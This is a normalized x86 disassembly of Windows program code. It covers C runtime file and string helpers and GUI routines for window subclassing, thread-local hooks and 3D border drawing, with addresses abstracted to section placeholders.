je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_410cc6
and [ esi + 0x1c ] 0x0
pop ecx
sub_41962e
push ebx
mov ebx [ esp + 0x8 ]
cmp ebx [ rw-data ]
push esi
push edi
jae r-xdata
call sub_4129af
mov [ eax ] 0x9
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_4188c0
mov eax [ edi ]
pop ecx
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4129af
mov [ eax ] 0x9
or esi 0xffffffff
push ebx
call sub_41887e
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor esi esi
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push ebx
call sub_41891f
pop ecx
mov eax esi
jmp r-xdata
call sub_4129b8
mov [ eax ] esi
test esi esi
je r-xdata
sub_4196c1
push ebp
mov ebp esp
sub esp 0x24
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov cx [ ebx + 0xa ]
xor eax eax
push edi
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov ax [ esi + 0xa ]
mov edi ecx
mov edx 0x7fff
xor edi eax
and eax edx
and ecx edx
and edi 0x8000
cmp ax 0x7fff
lea edx [ ecx + eax ]
mov [ ebp + 0x8 ] edx
jae r-xdata
neg di
sbb edi edi
and [ esi + 0x4 ] 0x0
and edi 0x80000000
add edi 0x7fff8000
and [ esi ] 0x0
mov [ esi + 0x8 ] edi
cmp cx 0x7fff
jae r-xdata
cmp dx 0xbffd
ja r-xdata
cmp dx 0x3fbf
ja r-xdata
test ax ax
mov edx 0x7fffffff
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc [ ebp + 0x8 ]
test [ esi + 0x8 ] edx
jne r-xdata
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
jmp r-xdata
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0xc ] 0x5
inc [ ebp + 0x8 ]
test [ ebx + 0x8 ] edx
jne r-xdata
xor eax eax
cmp [ esi + 0x4 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
add [ ebp - 0x4 ] 0x2
inc [ ebp - 0x10 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
add eax esi
lea ecx [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x18 ] eax
cmp [ ebx + 0x4 ] eax
jne r-xdata
cmp cx ax
jne r-xdata
cmp [ esi ] eax
jne r-xdata
mov eax [ ebp - 0x10 ]
add eax eax
cmp [ ebp + 0xc ] 0x0
jle r-xdata
add [ ebp + 0x8 ] 0xc002
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
add [ ebp - 0x8 ] 0x2
sub [ ebp - 0xc ] 0x2
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax ]
cmp [ ebx ] eax
jne r-xdata
jmp r-xdata
add [ ebp + 0x8 ] 0xffff
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
test [ ebp - 0x19 ] 0x80
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
imul eax ecx
mov ecx [ ebp - 0x4 ]
add ecx 0xfffffffc
push ecx
push eax
push [ ecx ]
call sub_418af9
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0xa ] ax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x8000
ja r-xdata
movsx eax [ ebp + 0x8 ]
neg eax
add [ ebp + 0x8 ] eax
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_418b78
add [ ebp + 0x8 ] 0xffff
pop ecx
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ ebp - 0x22 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x24 ]
and eax 0x1ffff
cmp eax 0x18000
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_418ba6
dec ebx
pop ecx
jne r-xdata
inc [ ebp - 0x14 ]
inc [ ebp - 0x22 ]
and [ ebp - 0x22 ] 0x0
cmp [ ebp - 0x1e ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp ax 0x7fff
jae r-xdata
test [ ebp - 0x24 ] 0x1
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov cx [ ebp - 0x22 ]
or eax edi
mov [ esi ] cx
mov ecx [ ebp - 0x20 ]
mov [ esi + 0x2 ] ecx
mov ecx [ ebp - 0x1c ]
mov [ esi + 0x6 ] ecx
inc [ ebp - 0x1e ]
jmp r-xdata
and [ ebp - 0x1e ] 0x0
cmp [ ebp - 0x1a ] 0xffff
jne r-xdata
or [ ebp - 0x24 ] 0x1
inc [ ebp - 0x1a ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp - 0x1a ] 0x8000
jmp r-xdata
sub_4198e1
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx rw-data
xor ecx ecx
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
pop ebx
leave
retn
jge r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
mov eax [ ebp + 0xc ]
mov ebx rw-data
neg eax
mov [ ebp + 0xc ] eax
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
push esi
push edi
cmp [ ebp + 0xc ] ecx
jne r-xdata
lea eax [ eax + eax * 2 ]
cmp [ ebx + eax * 4 ] 0x8000
lea esi [ ebx + eax * 4 ]
jb r-xdata
mov eax [ ebp + 0xc ]
add ebx 0x54
sar [ ebp + 0xc ] 0x3
and eax 0x7
cmp eax ecx
je r-xdata
pop edi
pop esi
push esi
push [ ebp + 0x8 ]
call sub_4196c1
pop ecx
pop ecx
xor ecx ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0xa ]
lea esi [ ebp - 0xc ]
sub_41995d
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
cmp [ rw-data ] ebx
push 0x1
pop edi
jne r-xdata
mov esi [ ebp + 0x14 ]
cmp esi ebx
jle r-xdata
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_415b8e
pop ecx
pop ecx
mov esi eax
mov [ ebp + 0x14 ] esi
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_415b8e
pop ecx
pop ecx
mov [ ebp + 0x1c ] eax
xor eax eax
mov [ rw-data ] 0x2
cmp eax edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
jne r-xdata
lea esp [ ebp - 0x4c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
cmp esi [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp [ ebp + 0x1c ] edi
jle r-xdata
push 0x2
push ebx
push ebx
push esi
push [ ebp + 0x10 ]
push 0x9
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
cmp esi edi
jg r-xdata
mov eax edi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
add eax eax
add eax 0x3
and al 0xfc
call sub_411530
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x3
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0x20 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
pop eax
jmp r-xdata
cmp esi ebx
jle r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov esi [ MultiByteToWideChar@IAT ]
call esi
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
push ebx
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x9
push [ ebp + 0x20 ]
call esi
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_411530
mov [ ebp - 0x18 ] esp
mov edi esp
mov [ ebp - 0x28 ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
cmp edi ebx
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push esi
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
push esi
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
sub_419bda
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
push 0x3d
push [ ebp + 0x8 ]
call sub_411342
mov esi eax
pop ecx
cmp esi edi
pop ecx
mov [ ebp - 0x8 ] esi
je r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp [ esi + 0x1 ] bl
sete bl
cmp eax [ rw-data ]
jne r-xdata
cmp eax edi
jne r-xdata
push eax
call sub_419db9
pop ecx
mov [ rw-data ] eax
sub esi [ ebp + 0x8 ]
mov edi [ rw-data ]
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x8 ]
call sub_419d61
mov esi eax
pop ecx
test esi esi
pop ecx
jl r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
test ebx ebx
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp ebx edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
xor eax eax
jmp r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
push 0x4
call sub_410b8c
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_41943d
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi * 4 + 0x8 ]
push eax
push edi
call sub_4124ad
pop ecx
test eax eax
pop ecx
je r-xdata
neg esi
mov eax [ ebp + 0x8 ]
mov [ edi + esi * 4 ] eax
jmp r-xdata
push [ edi + esi * 4 ]
lea edi [ edi + esi * 4 ]
call sub_410cc6
pop ecx
mov [ eax ] edi
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + esi * 4 ] ecx
and [ eax + esi * 4 + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax esi
shl eax 0x2
push eax
push [ ebp - 0x4 ]
call sub_4124ad
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ edi + 0x4 ]
inc esi
mov [ edi ] eax
add edi 0x4
jmp r-xdata
push 0x4
call sub_410b8c
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_411a10
inc eax
inc eax
push eax
call sub_410b8c
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov [ eax ] edi
push [ ebp + 0x8 ]
push esi
call sub_415bf0
mov eax esi
pop ecx
sub eax [ ebp + 0x8 ]
pop ecx
add eax [ ebp - 0x8 ]
and [ eax ] 0x0
inc eax
neg ebx
sbb ebx ebx
not ebx
and ebx eax
push ebx
push esi
call [ SetEnvironmentVariableA@IAT ]
push esi
call sub_410cc6
pop ecx
mov [ rw-data ] eax
sub_419d61
push esi
mov esi [ rw-data ]
push edi
mov eax [ esi ]
test eax eax
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
add esi 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi ]
cmp al 0x3d
je r-xdata
push edi
push eax
push [ esp + 0x14 ]
call sub_4193fe
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop edi
pop esi
retn
sub_419db9
push edi
mov edi [ esp + 0x8 ]
xor ecx ecx
test edi edi
jne r-xdata
cmp [ edi ] 0x0
lea eax [ edi + 0x4 ]
je r-xdata
xor eax eax
pop edi
retn
push ebx
push ebp
lea eax [ ecx * 4 + 0x4 ]
push esi
push eax
call sub_410b8c
mov esi eax
pop ecx
test esi esi
mov ebp esi
jne r-xdata
mov edx [ eax ]
inc ecx
add eax 0x4
test edx edx
jne r-xdata
mov eax [ edi ]
mov ebx edi
push 0x9
call sub_41098a
pop ecx
and [ esi ] 0x0
mov eax ebp
pop esi
pop ebp
pop ebx
pop edi
retn
push eax
add ebx 0x4
call sub_4113d9
mov [ esi ] eax
mov eax [ ebx ]
pop ecx
add esi 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_419e20
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_4129af
mov [ eax ] 0x9
call sub_4129b8
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_4188c0
push esi
call sub_419e7d
push esi
mov edi eax
call sub_41891f
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_419e7d
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_41887e
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
je r-xdata
xor eax eax
push edi
call sub_41293c
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2
call sub_41887e
push 0x1
mov edi eax
call sub_41887e
pop ecx
cmp eax edi
pop ecx
je r-xdata
cmp esi 0x2
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_41887e
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_4187ff
mov eax esi
and esi 0x1f
sar eax 0x5
pop ecx
mov eax [ eax * 4 + rw-data ]
lea ecx [ esi + esi * 8 ]
and [ eax + ecx * 4 + 0x4 ] 0x0
test edi edi
je r-xdata
sub_419f00
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_410cc6
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_419f70
push esi
push edi
mov esi [ esp + 0xc ]
push esi
call sub_419f50
add esp 0x4
mov edi eax
test edi edi
jne r-xdata
mov eax edi
pop edi
pop esi
retn
mov eax [ esp + 0x10 ]
cmp eax 0x6
jne r-xdata
lea eax [ eax + eax * 2 ]
mov edi [ eax * 8 + rw-data ]
mov edi [ rw-data ]
jmp r-xdata
push edi
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ SetPropA@IAT ]
sub_419fc0
sub esp 0x10
xor eax eax
mov ax [ rw-data ]
push esi
mov esi [ esp + 0x18 ]
push edi
push eax
mov edi [ GetPropA@IAT ]
push esi
call edi
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x10
retn
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call edi
test eax eax
jne r-xdata
push esi
call sub_419f50
add esp 0x4
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x20 ]
push eax
push 0xfffffffc
push esi
call [ SetWindowLongA@IAT ]
push eax
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call [ SetPropA@IAT ]
push esi
call [ IsWindowUnicode@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x8 ]
push 0x10
push eax
push esi
call [ GetClassNameA@IAT ]
lea ecx [ esp + 0x8 ]
push rw-data
push ecx
call [ lstrcmpiA@IAT ]
test eax eax
sub_41a0b0
mov eax [ esp + 0x8 ]
sub esp 0x4
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x14 ]
push edi
push esi
mov edx [ rw-data ]
push eax
push ecx
push edx
call [ CallNextHookEx@IAT ]
mov edi eax
mov ecx [ rw-data ]
cmp [ esi + 0xc ] ecx
jne r-xdata
mov eax edi
pop edi
pop esi
add esp 0x4
retn 0xc
mov eax [ rw-data ]
push eax
call [ UnhookWindowsHookEx@IAT ]
cmp [ rw-data ] 0x35f
jb r-xdata
mov [ esp + 0x8 ] 0x1
push 0xfffffff0
mov eax [ esi + 0xc ]
push eax
call [ GetWindowLongA@IAT ]
mov [ esp + 0x8 ] 0x0
test al 0x4
jne r-xdata
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax [ rw-data ]
mov ecx [ esi + 0xc ]
push eax
push ecx
call sub_419fc0
add esp 0x8
lea eax [ esp + 0x8 ]
mov ecx [ esi + 0xc ]
push eax
push 0x0
push 0x11f0
push ecx
call [ SendMessageA@IAT ]
cmp [ esp + 0x8 ] 0x0
je r-xdata
sub_41a160
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
call [ GetCurrentThreadId@IAT ]
push eax
mov ecx [ rw-data ]
push ecx
push sub_41a0b0
push 0x4
call [ SetWindowsHookExA@IAT ]
mov [ rw-data ] eax
retn
sub_41a1a0
mov eax [ esp + 0x14 ]
push ebx
push esi
push edi
mov esi [ esp + 0x10 ]
push eax
push esi
call sub_419f70
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
add esp 0x8
push ecx
push edx
push ebx
push esi
push eax
call [ CallWindowProcA@IAT ]
mov edi eax
mov ebx [ RemovePropA@IAT ]
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call ebx
xor eax eax
mov ax [ rw-data ]
push eax
push esi
call ebx
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_41a220
push esi
mov esi rw-data
push esi
call sub_41a200
add esp 0x4
add esi 0x4
cmp esi rw-data
jb r-xdata
push rw-data
call sub_41a200
add esp 0x4
pop esi
retn
sub_41a250
mov eax [ esp + 0x8 ]
push esi
push 0xf00021
mov esi [ eax + 0x4 ]
mov edx [ eax ]
mov ecx [ eax + 0xc ]
sub ecx esi
mov eax [ eax + 0x8 ]
push ecx
sub eax edx
mov ecx [ esp + 0x10 ]
push eax
push esi
push edx
push ecx
call [ PatBlt@IAT ]
pop esi
retn
sub_41a280
mov eax [ esp + 0xc ]
sub esp 0x10
and eax 0xffff
push ebx
push esi
push edi
push ebp
mov ecx [ eax * 4 + rw-data ]
mov edi [ esp + 0x24 ]
push ecx
push edi
call [ SetBkColor@IAT ]
mov esi eax
mov ebx [ esp + 0x28 ]
lea ecx [ esp + 0x10 ]
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
mov ebp [ ebx + 0x8 ]
mov [ ecx ] eax
mov eax [ ebx + 0xc ]
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] ebp
mov bp [ esp + 0x34 ]
mov [ ecx + 0xc ] eax
mov eax [ esp + 0x14 ]
inc eax
test bp 0x2
mov [ esp + 0x1c ] eax
je r-xdata
mov eax [ ebx + 0xc ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x10 ]
inc eax
test bp 0x1
mov [ esp + 0x18 ] eax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push edi
call [ ExtTextOutA@IAT ]
mov ax [ esp + 0x30 ]
cmp [ esp + 0x2c ] ax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push edi
call [ ExtTextOutA@IAT ]
mov eax [ ebx + 0x8 ]
mov [ esp + 0x18 ] eax
dec eax
test bp 0x4
mov [ esp + 0x10 ] eax
je r-xdata
movzx eax ax
mov ecx [ eax * 4 + rw-data ]
push ecx
push edi
call [ SetBkColor@IAT ]
test bp 0x8
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push edi
call [ ExtTextOutA@IAT ]
push esi
push edi
call [ SetBkColor@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x10
retn
mov eax [ ebx ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x1c ]
dec eax
test bp 0x1000
mov [ esp + 0x14 ] eax
je r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x2
push 0x0
push 0x0
push edi
call [ ExtTextOutA@IAT ]
sub [ esp + 0x18 ] 0x2
sub_41a3c0
mov ecx [ esp + 0x8 ]
sub esp 0x10
lea edx [ esp ]
push esi
push edi
mov eax [ ecx ]
mov esi [ ecx + 0x4 ]
mov edi [ ecx + 0x8 ]
mov [ edx ] eax
mov eax [ ecx + 0xc ]
mov [ edx + 0x4 ] esi
mov [ edx + 0x8 ] edi
mov di [ esp + 0x24 ]
mov [ edx + 0xc ] eax
mov ax di
lea edx [ esp + 0x8 ]
and ax 0xf
mov esi [ esp + 0x1c ]
push eax
push 0x1
push 0x7
push edx
push esi
call sub_41a280
dec [ esp + 0x1c ]
dec [ esp + 0x20 ]
lea ecx [ esp + 0x1c ]
inc [ esp + 0x24 ]
inc [ esp + 0x28 ]
add esp 0x14
push edi
push 0x0
push 0x2
push ecx
push esi
call sub_41a280
add esp 0x14
pop edi
pop esi
add esp 0x10
retn
sub_41a430
mov ecx [ esp + 0x4 ]
sub esp 0x10
lea eax [ esp ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push ecx
mov ecx [ esp + 0x4 ]
push edx
mov edx [ esp + 0x20 ]
push eax
push ecx
push edx
call [ IntersectClipRect@IAT ]
add esp 0x10
retn
sub_41a470
mov eax [ esp + 0x8 ]
sub esp 0x108
push ebx
cmp [ eax ] 0x0
push esi
push edi
lea esi [ esp + 0x14 ]
je r-xdata
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x14 ]
push eax
mov [ esi ] 0x0
push ecx
call [ lstrlenA@IAT ]
lea ecx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x120 ]
push ecx
push eax
call [ GetTextExtentPointA@IAT ]
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x120 ]
mov edx [ esp + 0x10 ]
mov [ eax ] ecx
mov ecx [ esp + 0x124 ]
pop edi
pop esi
pop ebx
mov [ ecx ] edx
add esp 0x108
retn
mov edi [ CharNextA@IAT ]
xor ebx ebx
cmp [ rw-data ] bl
je r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
mov cl [ eax ]
inc eax
mov [ esi ] cl
inc esi
cmp cl [ rw-data ]
jne r-xdata
jmp r-xdata
mov cl [ eax ]
cmp cl 0x26
jne r-xdata
cmp cl 0x1e
je r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
inc eax
cmp [ eax ] bl
je r-xdata
cmp cl 0x1f
jne r-xdata
jmp r-xdata
push eax
call edi
jmp r-xdata
cmp [ eax ] bl
jne r-xdata
sub_41a520
push esi
push rw-data
call [ InitializeCriticalSection@IAT ]
push rw-data
call [ EnterCriticalSection@IAT ]
push rw-data
inc [ rw-data ]
call [ LeaveCriticalSection@IAT ]
cmp [ rw-data ] 0x1
jne r-xdata
mov esi [ esp + 0x8 ]
mov esi [ esp + 0x8 ]
push 0x0
push 0x1
push esi
call sub_41d420
add esp 0xc
call sub_41aff0
jmp r-xdata
mov eax [ rw-data ]
pop esi
retn 0x4
push esi
call sub_41a650
call sub_41a7a0
test eax eax
je r-xdata
sub_41a590
push ebx
push esi
push edi
push ebp
xor ebp ebp
call [ GetCurrentThreadId@IAT ]
mov ebx eax
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] ebp
jle r-xdata
push rw-data
dec [ rw-data ]
call [ LeaveCriticalSection@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp * 4 ]
cmp [ eax + eax * 4 + rw-data ] ebx
lea esi [ eax + eax * 4 ]
jne r-xdata
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
call sub_41b1e0
inc ebp
cmp ebp [ rw-data ]
jl r-xdata
mov eax [ esi + rw-data ]
dec eax
mov [ esi + rw-data ] eax
je r-xdata
mov eax [ esi + rw-data ]
push eax
call [ UnhookWindowsHookEx@IAT ]
dec [ rw-data ]
cmp ebp [ rw-data ]
jge r-xdata
mov eax [ esp + 0x14 ]
cmp [ esi + rw-data ] eax
jne r-xdata
lea edi [ esi + rw-data ]
lea eax [ edi + 0x14 ]
mov ecx 0x5
mov esi eax
inc ebp
[ edi ] [ esi ]
mov edi eax
cmp ebp [ rw-data ]
jl r-xdata
sub_41a660
cmp [ rw-data ] 0x30a
push esi
push edi
jae r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edi
pop esi
retn 0x8
mov esi [ esp + 0x10 ]
or esi 0x1
test esi 0x2
je r-xdata
xor eax eax
pop edi
pop esi
retn 0x8
push rw-data
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] 0x80
je r-xdata
and esi 0xfffffffc
push rw-data
call [ LeaveCriticalSection@IAT ]
xor eax eax
pop edi
pop esi
retn 0x8
call [ GetCurrentThreadId@IAT ]
mov edi eax
xor eax eax
cmp [ rw-data ] eax
jle r-xdata
push edi
mov eax [ rw-data ]
push eax
push sub_41b7c0
push 0x5
call [ SetWindowsHookExA@IAT ]
test eax eax
je r-xdata
mov ecx rw-data
mov edx [ rw-data ]
mov ecx [ esp + 0xc ]
shl edx 0x2
mov [ edx + edx * 4 + rw-data ] ecx
mov ecx [ rw-data ]
shl ecx 0x2
mov [ ecx + ecx * 4 + rw-data ] edi
mov ecx [ rw-data ]
shl ecx 0x2
mov [ ecx + ecx * 4 + rw-data ] eax
mov eax [ rw-data ]
shl eax 0x2
mov [ eax + eax * 4 + rw-data ] 0x1
mov eax [ rw-data ]
shl eax 0x2
mov [ eax + eax * 4 + rw-data ] esi
mov ecx [ rw-data ]
mov [ rw-data ] edi
mov [ rw-data ] ecx
inc [ rw-data ]
shl eax 0x2
inc [ eax + eax * 4 + rw-data ]
jmp r-xdata
add ecx 0x14
inc eax
cmp eax [ rw-data ]
jl r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax 0x1
pop edi
pop esi
retn 0x8
cmp [ ecx ] edi
je r-xdata
sub_41a7a0
call [ GetCurrentThreadId@IAT ]
xor edx edx
cmp [ rw-data ] edx
